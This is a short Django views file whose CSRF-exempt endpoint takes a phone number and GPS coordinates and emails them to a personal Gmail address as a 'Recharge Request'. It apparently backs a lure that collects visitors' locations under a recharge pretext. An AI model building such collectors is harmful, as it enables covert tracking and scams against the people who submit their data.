from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from django.core.mail import send_mail

def home(request):
    return render(request, 'home.html')

@csrf_exempt
def save_location(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode('utf-8'))
            latitude = data.get("latitude")
            longitude = data.get("longitude")
            phone = data.get("phone")

            if not phone:
                return JsonResponse({"error": "Phone number required"}, status=400)

            location_text = f"Latitude: {latitude}, Longitude: {longitude}" if latitude and longitude else "Location not provided"

            # Email content
            subject = "Recharge Request + Location"
            message = f"Phone: {phone}\nLocation: {location_text}"

            send_mail(
                subject, message, "swapeatmail@gmail.com", ["piyushphysics834@gmail.com"]
            )

            return JsonResponse({"message": "Recharge request received"})

        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format"}, status=400)

    return JsonResponse({"error": "Invalid request method"}, status=400)
